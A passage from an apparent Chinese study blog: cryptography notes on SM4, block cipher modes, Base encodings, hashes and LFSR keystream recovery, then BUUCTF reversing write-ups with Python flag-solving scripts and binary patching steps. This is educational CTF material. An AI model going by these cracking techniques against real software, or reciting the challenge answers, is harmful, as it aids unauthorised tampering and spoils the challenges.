&#x2F;&#x2F; 解密，并写入文件 b.txt    bitset&lt;64&gt; temp_plain &#x3D; decrypt(temp);    file1.open(&quot;D:&#x2F;&#x2F;b.txt&quot;, ios::binary | ios::out);    file1.write((char*)&amp;temp_plain,sizeof(temp_plain));    file1.close();    return 0;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SM4加密算法"><a href="#SM4加密算法" class="headerlink" title="SM4加密算法"></a>SM4加密算法</h4><ol><li><p>加密解密流程图如下：<br><img src="/2021/120547052/52.png" alt=" ">  </p></li><li><p>加密  </p></li></ol><ul><li>输入的明文为 128bit 的数据将其按位拆分成 4 个 32bit 的数据x0,x1,x2,x3，当i=0 时为第一次轮变换，一直进行到 i=31 结束  </li><li>xi  暂时不做处理，将 xi+1,xi+2,xi+3 和轮密钥 rki 异或得到一个 32bit 的数据，作为盒变换的输入<br>即 sbox_input=xi+1⊕xi+2⊕xi+3⊕rki，⊕ 符号代表异或运算  </li><li>将 sbox_input 拆分成 4 个 8bit 数据，分别进行盒变换，之后再将 4 个 8bit 输出合并成一个 32bit 的 sbox_output  </li><li>将刚才获得的 sbox_output 分别循环左移 2，10，18，24 位，得到 4 个 32bit 的结果，记移位结果为 y2,y10,y18,y24  </li><li>将移位的结果 y2,y10,y18,y24 与盒变换输出 sbox_output 和 xi 异或，得到 xi+4<br>即 xi+4=sbox_output⊕y2⊕y10⊕y18⊕y24⊕xi  </li><li>至此完成了一轮的加解密运算<br>在实际加解密过程中，上述运算要执行 32 轮，同时使用 32 个不同的 rki，rki 由密钥拓展生成  </li><li>最后将生成的最后 4 个 32bit 数据 x35,x34,x33,x32 合并成一个 128bit 的数据 output，作为最后的输出结果<br>其中的盒变换的盒子如下图<br><img src="/2021/120547052/49.png" alt=" ">  </li></ul><ol><li>密钥拓展  </li></ol><ul><li>输入的原始密钥 key 为 128bit 的数据，将其按位拆分成 4 个 32bit 的数据 K0,K1,K2,K3  </li><li>将初始密钥 K0,K1,K2,K3 分别异或固定参数 FK0,FK1,FK2,FK3 得到用于循环的密钥 k0,k1,k2,k3<br>即 k0=K0⊕FK0,k1=K1⊕FK1,k2=K2⊕FK2,k3=K3⊕FK3  </li><li>进入轮密钥 rki 的生成<br>当 i=0 时为第一次轮变换，一直进行到 i=31 结束  </li><li>ki  暂时不做处理，将 ki+1,ki+2,ki+3 和固定参数 CKi 异或得到一个 32bit 的数据，作为盒变换的输入<br>即 sbox_input=ki+1⊕ki+2⊕ki+3⊕cki  </li><li>将 sbox_input 拆分成 4 个 8bit 数据，分别进行盒变换，之后再将 4 个 8bit 输出合并成一个 32bit 的 sbox_output  </li><li>将刚才获得的 sbox_output 分别循环左移 13，23 位，得到 2 个 32bit 的结果，记移位结果为 y13,y23  </li><li>将移位的结果 y13,y23 与盒变换输出 sbox_output 和 ki 异或，得到 ki+4<br>即 rki=ki+4=sbox_output⊕y13⊕y23⊕ki  </li><li>至此完成了一轮的加解密运算<br>在实际加解密过程中，上述运算要执行 32 轮，同时使用 32 个不同的 CKi，CKi 为固定参数  </li><li>执行完 32 轮后，便可获得 32 个用于加解密的 rki<br>其中要用的盒子上面有，CK和FK如下图<br>FK：<br><img src="/2021/120547052/50.png" alt=" "><br>CK:<br><img src="/2021/120547052/51.png" alt=" ">  </li></ul><h3 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ol><li>分组密码的工作模式是指以这个分组密码为基础通过某种方式构造一个分组密码系统，以解决对任意长度明文的加密问题  </li></ol><h4 id="1电码本-ECB-模式"><a href="#1电码本-ECB-模式" class="headerlink" title="1电码本(ECB)模式"></a>1电码本(ECB)模式</h4><ol><li>ECB 模式是直接使用分组密码的工作模式，明文的各个分组独立地使用同一密钥 k 加密  </li><li>加解密框图如下：<br><img src="/2021/120547052/53.png" alt=" ">  </li><li>分组短块<br>直接扩充法–直接补0或者其他固定bit–添加随机数(填充的最好是可以识别身份的)<br>密文挪用法–从最后的密文开始在最后进行填充  </li></ol><h4 id="密码分组链接-CBC-模式"><a href="#密码分组链接-CBC-模式" class="headerlink" title="密码分组链接(CBC)模式"></a>密码分组链接(CBC)模式</h4><ol><li>加密<br><img src="/2021/120547052/54.png" alt=" ">  </li><li>解密<br><img src="/2021/120547052/55.png" alt=" ">  </li></ol><h4 id="密码反馈-CFB-模式"><a href="#密码反馈-CFB-模式" class="headerlink" title="密码反馈(CFB)模式"></a>密码反馈(CFB)模式</h4><ol><li>加密<br><img src="/2021/120547052/56.png" alt=" ">  </li><li>解密<br><img src="/2021/120547052/57.png" alt=" ">  </li></ol><h4 id="输出反馈-OFB-模式"><a href="#输出反馈-OFB-模式" class="headerlink" title="输出反馈(OFB)模式"></a>输出反馈(OFB)模式</h4><ol><li>加密<br><img src="/2021/120547052/58.png" alt=" ">  </li><li>解密<br><img src="/2021/120547052/59.png" alt=" ">  </li></ol><h4 id="计数器-CTR-模式"><a href="#计数器-CTR-模式" class="headerlink" title="计数器(CTR)模式"></a>计数器(CTR)模式</h4><ol><li>原理：利用固定密钥k对自然数序列1,2,3,…,n, …加密，将得到的密文分组序列看作乱数序列。按加减密码的方式与明文分组逐位模2加的一种方式  </li></ol><h2 id="其他密码学"><a href="#其他密码学" class="headerlink" title="其他密码学"></a>其他密码学</h2><h3 id="base加密"><a href="#base加密" class="headerlink" title="base加密"></a>base加密</h3><ol><li><p>原理<br>a. 将三个八位的字节转化为四个六位的字节，不足补零。它是用64个可打印字符表示二进制所有数据方法。由于2的6次方等于64，所以可以用每6个位元为一个单元，对应某个可打印字符。我们知道三个字节有24个位元，就可以刚好对应于4个Base64单元，即3个字节需要用4个Base64的可打印字符来表示。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9 ，这样共有62个字符，此外两个可打印符号在不同的系统中一般有所不同。但是，我们经常所说的Base64另外2个字符是：“+/”。这64个字符，所对应的索引表如下(索引号不是对应的ascii值)：<br><img src="/2021/120547052/11.png" alt=" "><br>b. 转换的时候，将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。数据不足3byte的话，于缓冲区中剩下的bit用0补足。然后，每次取出6个bit，按照其值选择<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>中的字符作为编码后的输出。不断进行，直到全部输入数据转换完成。所以加密后的数据量是原来的4/3。<br>c. 但转换的字节数不一定就是24的整数倍，会出现有多余不足六位的情况，在base64中处理的方法是加零凑够六位，但是这样一来在解码的时候就会出现多余的位，这该怎么办呢？ 不用担心，base64想到了一个很好的解决办法。<br>​d. 这个办法就是在base64凑零的同时，还要满足凑出来的位数是8的倍数，不然就加一个或者两个特殊的六位=符号。为什么是一个或者两个=符号呢？因为多个8位转为6位 只会出现剩余2位、4位的情况，剩余2位时只需要一个表示六位的=便可变为8的整数；而剩余4位 需要两个表示6位的=便可以变为8的整数。然后在解密的时候不解析=即可。<br>​之所以位的总数需要凑成8的倍数，是因为base64主要用于加密后的数据传送，而在传送机制中都认为传送的最小单位是按照字节算的，所以不能出现不是位总数不是8的倍数的情况，在接收到数据后，按顺序将6位的base64直接按照顺序解密成字节就完成解密了。<br><img src="/2021/120547052/12.png" alt=" ">  </p></li><li><p>base加密系列字母表  </p></li><li><p><strong>base16：0到9，A到F<a href="https://www.qqxiuzi.cn/bianma/base.php?type=16">在线解密</a></strong>  </p></li><li><p><strong>base32：A到Z，2到7<a href="https://www.qqxiuzi.cn/bianma/base.php">在线解密</a></strong>  </p></li><li><p>base36：0到9，a到z<a href="http://ctf.ssleye.com/base36w.html">在线解密</a>  </p></li><li><p><strong>base58:1到9，a到z，A到Z<a href="http://www.metools.info/code/c74.html">在线解密</a></strong>  </p></li><li><p><strong>base62:0到9，a到z，A到Z<a href="http://www.atoolbox.net/Tool.php?Id=933">在线解密</a></strong>  </p></li><li><p><strong>base64:a到z，A到Z，0到9，特别地有/+（可以转图片）<a href="https://tool.oschina.net/encrypt?type=3">在线解密</a></strong>  </p></li><li><p><strong>base91：A到Z，a到z，0到9，!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~）<a href="http://www.atoolbox.net/Tool.php?Id=935">在线解密</a></strong>  </p></li><li><p><strong>base92：0到9，A到Z，a到z，!#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_{|｝<a href="http://ctf.ssleye.com/base92.html">在线解密</a></strong>  </p></li><li><p><strong>base128：0到9，A到Z，a到z，\xb5\xb6\xb7\xbc\xbd\xbe\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</strong>  </p></li></ol><h3 id="Hash-哈希算法"><a href="#Hash-哈希算法" class="headerlink" title="Hash(哈希算法)"></a>Hash(哈希算法)</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>特征：md5加密后是16位或者32位的字符，由字母和数字组成，字母大小写统一；<br>理论上无法解密，除非暴力破解  </p><h4 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h4><p>特征：SHA-1加密后的密文是40个字符，并且由数字字母组成；  </p><h4 id="SHA-2"><a href="#SHA-2" class="headerlink" title="SHA-2"></a>SHA-2</h4><p>特征：SHA-2 又分为两种算法，SHA-224 和 SHA-256。两者生成的密文都是由 0-9a-fA-F 组成的，其中 SHA-224 的密文长度固定是 56，SHA-256 的密文长度是 64 。  </p><h3 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>原理:  </p><ul><li>利用密钥K产生一个密钥流z=z0z1z2…，并使用如下规则对明文串x=x0x1x2…加密：y=y0y1y2=Ez0(x0)Ez1(x1)Ez2(x2)…  </li><li>密钥流由密钥流发生器产生：Z=f(k,σi),这里σi是加密器中的记忆元件（储存器）在时刻i的状态，f是由密钥k和σi产生的函数。  </li></ul><p>其他：  </p><ul><li>分组密码与流密码的区别就在于有无记忆性  </li><li>同步流密码概念模型如下<br><img src="/2021/120547052/13.png" alt=" ">  </li><li>有限状态自动机逻辑类似逻辑设计学习中的现态次态状态表  </li><li>密钥流产生器  </li></ul><ol><li>一般组成为：一个参数为K的有限状态自动机，由一个输出符号集z、一个状态集Σ、两个函数φ和ψ以及一个初始状态σ0  </li><li>方式：状态转移函数φ：σi-&gt;σi+1，将当前状态σi变为一个新状态σi+1，输出函数ψ:σi-&gt;Zi，当前状态σi变为输出符号集中的一个元素Zi  </li><li>采用方法：非线性函数的方法  </li><li>作为有限状态自动机的密钥流生成器和密钥流生成器分解图如下：<br><img src="/2021/120547052/14.png" alt=" ">  </li><li>常见的两种密钥流产生器如下图<br><img src="/2021/120547052/15.png" alt=" ">  </li></ol><h4 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h4><ul><li>概念：移位寄存器是六密码产生密钥流的一个主要组成部分  </li><li>GF(2)上的n级反馈移位寄存器如下图<br><img src="/2021/120547052/16.png" alt=" ">  </li><li>我们常用的一般是这种：<br><img src="/2021/120547052/17.png" alt=" ">  </li><li>公式是：<br><img src="/2021/120547052/18.png" alt=" ">  </li><li>说明：其中的C1…Cn反应的应该是a0…an是否参与反馈，这种一般都会有一个周期  </li></ul><h4 id="线性反馈移位寄存器的一元多项式表示"><a href="#线性反馈移位寄存器的一元多项式表示" class="headerlink" title="线性反馈移位寄存器的一元多项式表示"></a>线性反馈移位寄存器的一元多项式表示</h4><ul><li>形式<br>设n级线性移位寄存器的输出序列{ai}满足递推关系：<br><img src="/2021/120547052/19.png" alt=" "><br>对任何K&gt;=1成立，这种递推关系可用一个一元高次多项式<br><img src="/2021/120547052/20.png" alt=" "><br>表示，称这个多项式为LFSR的特征多项式  </li><li>相关定理  </li></ul><p>2.1定义及定理<br><img src="/2021/120547052/21.png" alt=" "><br>2.2定理及定义<br><img src="/2021/120547052/22.png" alt=" "><br><img src="/2021/120547052/23.png" alt=" "><br><img src="/2021/120547052/24.png" alt=" "><br>2.3定义及定理<br><img src="/2021/120547052/25.png" alt=" "><br><img src="/2021/120547052/26.png" alt=" "><br>2.4定理<br><img src="/2021/120547052/27.png" alt=" "><br>2.5定理<br><img src="/2021/120547052/28.png" alt=" "><br>2.4定义和2.6定理<br><img src="/2021/120547052/29.png" alt=" "><br><img src="/2021/120547052/30.png" alt=" ">  </p><h4 id="m序列的伪随机性"><a href="#m序列的伪随机性" class="headerlink" title="m序列的伪随机性"></a>m序列的伪随机性</h4><ul><li>流密码的安全性取决于密钥流的安全性  </li><li>游程的概念：00110：0的2游程、1的2游程、0的1游程  </li><li>定义2.5<br><img src="/2021/120547052/31.png" alt=" ">  </li><li>Golomb对伪随机周期序列提出了应满足的如下三个随机性公设：  </li></ul><p>1.在序列的一个周期内，0与1的个数相差至多为1<br>2.在序列的一个周期内，长为1的游程占游程总数的1/2，长为2的游程占游程总数的(1/2)^2,…,长为i的游程占游程总数的(1/2)^i,且在等长的游程中0的游程个数和1的游程个数相等<br>3.异自相关函数是一个常数  </p><ul><li>从密码系统的角度看，一个伪随机序列还应满足下面的条件:  </li></ul><p>1.{ai}的周期相当大<br>2.{ai}的确定在计算上是容易的<br>3.{ai}由密文及相应的明文的部分信息,不能确定整个{ai}  </p><ul><li>定理2.7<br><img src="/2021/120547052/32.png" alt=" ">  </li></ul><h4 id="m序列的破译"><a href="#m序列的破译" class="headerlink" title="m序列的破译"></a>m序列的破译</h4><p>例如：<br>设敌手得到密文串101101011110010和相应的明文串  011001111111001，因此可计算出相应的密钥流为110100100001011。进一步假定敌手还知道密钥流是使用5级线性反馈移位寄存器产生的，那么敌手可分别用密文串中的前10个比特和明文串中的前10个比特建立如下方程<br><img src="/2021/120547052/33.png" alt=" "><br>之后：<br><img src="/2021/120547052/34.png" alt=" "><br>最后得到：<br><img src="/2021/120547052/35.png" alt=" ">  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向题</title>
      <link href="/2021/120454815.html"/>
      <url>/2021/120454815.html</url>
      
        <content type="html"><![CDATA[<h2 id="逆向题"><a href="#逆向题" class="headerlink" title="逆向题"></a>逆向题</h2><h3 id="招新时期的题-haha-exe"><a href="#招新时期的题-haha-exe" class="headerlink" title="招新时期的题:haha.exe"></a>招新时期的题:haha.exe</h3><ol><li>首先，这道题放入Exeinfo PE中查看这道题的简单情况如下:  </li></ol><p><img src="/2021/120454815/1.png" alt=" "></p><p>在这几个界面，首先 1 的位置显示的是文件的名称；2 的位置显示的是文件信息，如果加壳会显示是什么壳；3 的位置显示的文件是32位还是64位，便于分析；4 的位置显示的是编写这个文件使用的哪种语言；5 中最开始显示是否带壳；之后提示打开文件可以运用的文件<br>2. 其次，haha.exe这个文件是一个可运行的程序，但是当你打开输入信息的时候会自动闪退，放入32位ida的时候可以看到该main()函数的地址一致会变化，这也是程序打开闪退的原因，针对这个问题，可以使用 studyPE 这个软件来固定基址，从而解决闪退的问题。<br>3. 再一，文件打开之后，F5显示伪代码(语法神似c语言)，这时候根据之前文件的正常运行，会将含有flag信息的代码信息直接跳过，例如:<br><img src="/2021/120454815/2.png" alt=" ">类似上图一样，涵盖flag的信息全没有<br>4. 再二，返回初始界面，根据流程图进行分析<br><img src="/2021/120454815/3.png" alt=" "><br>分析可以知道在004012F4位置原来有一个跳转，上面那个语法会满足跳转条件，从而让我们想要的信息被跳过，所以这时候我们需要将它nop掉来阻止跳转，结果如图<br>5. 再三，在进行上述操作之后，可以再次找到main(),F5显示伪代码，这个时候就可以分析了，看下图<br><img src="/2021/120454815/4.png" alt=" "><br>在这个图里分析可以看到，输入 1 会得到一个flag.doc文件，2走迷宫，3退出，同时分析知flag.doc打开之后要密码，即我们要走迷宫，然后分析到sub_401120()这里，点开如下<br><img src="/2021/120454815/6.png" alt=" "><br>在这里可以看到用wasd走迷宫，同时分析知迷宫格式在V5=dword_403300[v4 + v2]这里，之后走迷宫即可，之后得到的字符串需要在LABEL_15地址进行异或操作，得到真正的密码字符串<br>6. 最后，如下图<br><img src="/2021/120454815/7.png" alt=" "><br>最后flag改为henu，同时注意最好以命令行的形式打开.exe文件，不然还是会出现闪退的问题(这个应该不是基址的问题了)<br>7. 总结：<br>关键点:固定基址，除掉跳转(nop),程序打开方式  </p><h3 id="BUUCTF-reverse3-含base64加密"><a href="#BUUCTF-reverse3-含base64加密" class="headerlink" title="BUUCTF-reverse3(含base64加密)"></a>BUUCTF-reverse3(含base64加密)</h3><ol><li>用exeinfope.exe程序查看题的情况<br><img src="/2021/120454815/8.png" alt=" ">  </li><li>用32为ida打开文件，之后再边框下拉到最下面找到main函数入口，之后F5打开反汇编窗口。<br><img src="/2021/120454815/9.png" alt=" "><br><img src="/2021/120454815/10.png" alt=" ">  </li><li>之后可以看到如上诉照片的情况，依次分析  <ul><li>加密<br><img src="/2021/120454815/11.png" alt=" "><br><img src="/2021/120454815/12.png" alt=" "><br>可以看到此加密方式是base64加密方式  </li><li>算法处理  </li><li>比较操作之后的flag与str2的大小，所以我们可以先找到str2的字符串之后进行一系列上述操作解出flag<br><img src="/2021/120454815/13.png" alt=" "><br>str2字符串  </li></ul></li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">import base64s &#x3D; &quot;e3nifIH9b_C@n@dH&quot;x &#x3D; &quot;&quot;for i in range(0,len(s)):    x +&#x3D; chr(ord(s[i]) - i)print(base64.b64decode(x))  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="buuctf-SimpleRev-字符串的组合，输入判断"><a href="#buuctf-SimpleRev-字符串的组合，输入判断" class="headerlink" title="buuctf SimpleRev(字符串的组合，输入判断)"></a>buuctf SimpleRev(字符串的组合，输入判断)</h3><ol><li>用exeinfope.exe程序查看题的情况<br><img src="/2021/120454815/14.png" alt=" ">  </li><li>之后用64位IDA打开文件，找到对应的main函数之后F5打开反汇编窗口<br><img src="/2021/120454815/15.png" alt=" "><br>可以看到一个关键(Decry()),之后双击点开<br><img src="/2021/120454815/16.png" alt=" "><br><img src="/2021/120454815/17.png" alt=" ">  </li><li>1处：我们首先将*src,v9的16进制数据转换成字符串形式<br>2处：进行了三次组合:text = key3+v9,key = key +key1,key=key+src,三个依次进行，同时key1和key3可以直接双击点开查看<br>3处：进行变换，将key字符串中的大写字母变换成小写字母<br>4处：输入v1，同时知道输入字符之间有空格<br>5处：算法进行求str2<br>6处：test与str2进行比较，相同即满足条件  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">src &#x3D; &#39;NDCLS&#39;v9 &#x3D; &#39;hadow&#39;key1 &#x3D; &#39;ADSFK&#39;key3 &#x3D; &#39;kills&#39;text1 &#x3D; key3 + v9       # 这里的text1相当于 text &#x3D; key3 + v9text2 &#x3D; key1 + src      # 这里的text2相当于 key &#x3D; key1 + srctext2 &#x3D; text2.lower()   # 需要把大学字母变为小写字母flag &#x3D; &quot;&quot;for i in range(0,len(text1)):    for x in range(0,128):      # 这里用暴力求解        if chr(x).isalpha():    # 这里要加上判断x是否是字符串            temp &#x3D; (x - 39 - ord(text2[i]) + 97) % 26 + 97            if text1[i] &#x3D;&#x3D; chr(temp):                   flag &#x3D; flag + chr(x)                breakprint(&quot;flag&#123;&quot;+flag+&quot;&#125;&quot;)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-ACTF新生赛2020-easyre"><a href="#BUUCTF-ACTF新生赛2020-easyre" class="headerlink" title="BUUCTF [ACTF新生赛2020]easyre"></a>BUUCTF [ACTF新生赛2020]easyre</h3><ol><li>先查看文件信息，发现含有upx壳，之后用解壳工具upx或者od手动脱壳，之后拖入32位ida，找到main函数–&gt;F5<br><img src="/2021/120454815/18.png" alt=" "></li><li>1处：将字符串*F’&quot;N,&quot;(I?+@复制给V4<br>2处：R字符串转换可以看出与flag有关，且结合第三处可以知道，flag有12位<br>3处：进行查询变换，点开3处的_data_start__(),可以看到以下情况<br><img src="/2021/120454815/19.png" alt=" "><br>再结合三处情况可以知道，<em>data_start</em>_()里的字符串[i]-1，如果与v4[i]相等，则该字符串[i]即为flag里的一个字符串  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag1 &#x3D; &quot;*F&#39;\&quot;N,\&quot;(I?+@&quot;s &#x3D; list(flag1)flag&#x3D;&quot;&quot;string &#x3D; chr(0x7E)+&quot;&#125;|&#123;zyxwvutsrqponmlkjihgfedcba&#96;_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;&#x3D;&lt;;:9876543210&#x2F;.-,+*)(&quot; + chr(0x27) + &#39;&amp;%$# !&quot;&#39;for i in flag1:    for j in range(1,len(string)):        if ord(i) &#x3D;&#x3D; ord(string[j]):            flag+&#x3D;chr(j+1)print (&quot;flag&#123;&quot;+flag+&quot;&#125;&quot;)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-2019红帽杯-easyRE"><a href="#BUUCTF-2019红帽杯-easyRE" class="headerlink" title="BUUCTF [2019红帽杯]easyRE"></a>BUUCTF [2019红帽杯]easyRE</h3><ol><li>查看文件情况，无壳，64位，之后ida打开，发现没有main函数，之后shirt+F12，看到字符串You found me!!!双击，之后根据旁边找到它的地址在他地址进行反汇编<br><img src="/2021/120454815/20.png" alt=" "><br><img src="/2021/120454815/21.png" alt=" ">  </li><li>1、2、3处：将字符串分别复制给v12、v13、v14、同时v12[12] = 127 v13[3] = 127<br>4处：我们可以知道所求的字符串的长度是36<br>5处：进行了一个36位长度的异或操作，同时猜想可以知道此时的v12就是上述v12、v13、v14<br>之后疑惑可以指的，含有flag字符串，但不是我们想要的<br><img src="/2021/120454815/22.png" alt=" ">  </li><li>之后我们向下分析，可以看到这个图片里的东西，之后点开可以发现一串字符串，且编码形式是base64，我们将其解密到最后会发现最后给的是一个地址，不是flag<br><img src="/2021/120454815/23.png" alt=" ">  </li><li>继续向下分析，可以看到这里调用了off_6CC090，点开可以看到下面情况<br><img src="/2021/120454815/24.png" alt=" ">  </li><li>6处：我们之后会用到<br>7处：我们点击，之后跳到对应位置F5<br><img src="/2021/120454815/25.png" alt=" ">  </li><li>这才是flag的藏身之地，由上面那个箭头，我们可以猜出v1==v4==flag<br>之后我们用下面那个箭头所指结合6处和v4求出flag  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">v5 &#x3D; &#39;&#39;enc1 &#x3D; &#39;flag&#39;v2 &#x3D; &#39;&#39;enc &#x3D; [0x40,0x35,0x20,0x56,0x5D,0x18,0x22,0x45,0x17,0x2F,0x24,0x6E,0x62,0x3C,0x27,0x54,0x48,0x6C,0x24,0x6E,0x72,0x3C,0x32,0x45,0x5B]for i in range(4):    v5 +&#x3D; chr(enc[i] ^ ord(enc1[i]))print (v5)for i in range(len(enc)):    v2 +&#x3D; chr(enc[i] ^ ord(v5[i%4]))print(v2)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-MRCTF2020-Xor-扩展思维"><a href="#BUUCTF-MRCTF2020-Xor-扩展思维" class="headerlink" title="BUUCTF [MRCTF2020]Xor(扩展思维)"></a>BUUCTF [MRCTF2020]Xor(扩展思维)</h3><ol><li>查看文件情况，无壳，32位，之后ida打开，发现main函数，在main函数位置进行反汇编，发现如下情况<br><img src="/2021/120454815/26.png" alt=" ">  </li><li>之后到对应位置<br><img src="/2021/120454815/27.png" alt=" "><br>分析发现是无法正确识别调用问题的原因(call analysis failed问题总结于逆向中的一些基础中)  </li><li>之后在该位置进行双击进入该函数，并反汇编，然后在对main函数进行反汇编就行了<br><img src="/2021/120454815/28.png" alt=" ">  </li><li>该题脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag &#x3D;chr(77)+&#39;SAWB~FXZ:J:&#96;tQJ&quot;N@ bpdd&#125;8g&#39;s &#x3D; list(flag)for i in range(len(flag)):    s[i] &#x3D; chr(ord(s[i])^i)flag &#x3D; &quot;&quot;.join(s)print(flag)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-WUSTCTF2020-level1-文件读写"><a href="#BUUCTF-WUSTCTF2020-level1-文件读写" class="headerlink" title="BUUCTF [WUSTCTF2020]level1(文件读写)"></a>BUUCTF [WUSTCTF2020]level1(文件读写)</h3><ol><li>查看文件情况，无壳，64位，之后ida打开，发现main函数，在main函数位置进行反汇编<br><img src="/2021/120454815/29.png" alt=" ">  </li><li>1处：对文件flag进行读操作，可以猜想其实就是将flag读过来<br>2处：将读入的flag赋值给ptr<br>3处：关闭原文件<br>4处：对得到的flag进行一个简单的算法操作  </li><li>首先如果我们如果双击flag，我们会很“巧合”的发现下方正好有一个好像符合长度的一串16禁止数据，如下图<br><img src="/2021/120454815/30.png" alt=" "><br>之后我们对其进行编写脚本，发现这并不是我们想要的flag  </li><li>之后我们考虑、刚开始我们解压缩的时候还得到了一个.txt文件，总所周知，大部分情况有读就要有写吧，然后我们去打开那个.txt文件，发现一串数据，正好19个<br><img src="/2021/120454815/31.png" alt=" "><br>之后我们对这一串数据进行脚本，发现最后正好得到flag，大功告成  </li><li>脚本  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">ptr &#x3D; [198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800,6291456,1782,65536000]for i in range(19):    if (i+1) &amp; 1 !&#x3D; 0:        print(chr(ptr[i] &gt;&gt; (i+1)),end&#x3D;&quot;&quot;)    else:        print (chr(ptr[i] &#x2F;&#x2F; (i+1)),end&#x3D;&quot;&quot;)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-GWCTF-2019-xxor-类似tea加密"><a href="#BUUCTF-GWCTF-2019-xxor-类似tea加密" class="headerlink" title="BUUCTF [GWCTF 2019]xxor(类似tea加密)"></a>BUUCTF [GWCTF 